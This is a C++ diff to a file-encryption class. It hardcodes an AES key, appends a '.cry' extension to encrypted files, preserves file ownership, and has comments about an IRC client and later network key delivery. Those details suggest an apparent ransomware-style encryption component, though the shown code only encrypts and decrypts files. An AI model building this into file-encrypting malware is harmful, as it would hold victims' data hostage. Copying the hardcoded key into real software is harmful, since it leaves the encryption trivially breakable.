@@ -3,8 +3,7 @@
 CryptoManager::CryptoManager(const char* algo) 
  : encAlgo(algo) {
     // TEMP: reading in encryption key until secure network transmission has been setup
-    std::string stringKey("00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF"); 
-    this->keyStr = stringKey;
+    this->keyStr = "00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF";
  }
 
 SecByteBlock CryptoManager::hexToSecByteBlock(const std::string& hex) {
@@ -17,7 +16,7 @@ SecByteBlock CryptoManager::hexToSecByteBlock(const std::string& hex) {
 }
 
 void CryptoManager::encryptFile(const std::string& fileToEncrypt) { // change to string to pass info to irc client?
-    const std::string encryptedFile = fileToEncrypt.append(ENC_FILE_EXT);
+    std::string encryptedFile = fileToEncrypt + ".cry";
     SecByteBlock key;
     if (GeneralUtils::cStrAreEqual(encAlgo, "AES-128")) {
         key = hexToSecByteBlock(keyStr.substr(0, 32)); // 32 hex chars -> 128 bit
@@ -31,7 +30,7 @@ void CryptoManager::encryptFile(const std::string& fileToEncrypt) { // change to
 
 
 void CryptoManager::decryptFile(const std::string& fileToDecrypt) { // change to string to pass info to irc client?
-    const std::string decryptedFile = fileToDecrypt.substr(0, fileToDecrypt.length() - 4);
+    std::string decryptedFile = fileToDecrypt.substr(0, fileToDecrypt.length() - 4);
     SecByteBlock key;
     if (GeneralUtils::cStrAreEqual(encAlgo, "AES-128")) {
         key = hexToSecByteBlock(keyStr.substr(0, 32)); // 32 hex chars -> 128 bit
@@ -40,7 +39,7 @@ void CryptoManager::decryptFile(const std::string& fileToDecrypt) { // change to
     } else if(GeneralUtils::cStrAreEqual(encAlgo, "AES-256")) {
         key = hexToSecByteBlock(keyStr); // 64 chars -> 128 bit
     }
-    aesCbcDecryptFile(decryptedFile, decryptedFile, key);
+    aesCbcDecryptFile(fileToDecrypt, decryptedFile, key);
 }
 
 
@@ -67,6 +66,8 @@ void CryptoManager::aesCbcEncryptFile(const std::string& fileToEncrypt, const st
     outputFile.write(reinterpret_cast<const char*>(iv), sizeof(iv));
     outputFile.write(ciphertext.data(), ciphertext.size());
     outputFile.close();
+
+    changeFileOwnership(fileToEncrypt, encryptedFile);
 }
 
 
@@ -91,4 +92,19 @@ void CryptoManager::aesCbcDecryptFile(const std::string& fileToDecrypt, const st
     std::ofstream outputFile(decryptedFile, std::ios::binary);
     outputFile.write(decryptedtext.data(), decryptedtext.size());
     outputFile.close();
+
+    changeFileOwnership(fileToDecrypt, decryptedFile);
+}
+
+
+void CryptoManager::changeFileOwnership(const std::string& sourceFile, const std::string& targetFile) {
+    struct stat fileStat;
+    if (stat(sourceFile.c_str(), &fileStat) != 0) {
+        std::cerr << "Failed to retrieve file status for " << sourceFile << ": " << strerror(errno) << std::endl;
+        return;
+    }
+
+    if (chown(targetFile.c_str(), fileStat.st_uid, fileStat.st_gid) != 0) {
+        std::cerr << "Failed to change ownership of " << targetFile << ": " << strerror(errno) << std::endl;
+    }
 }
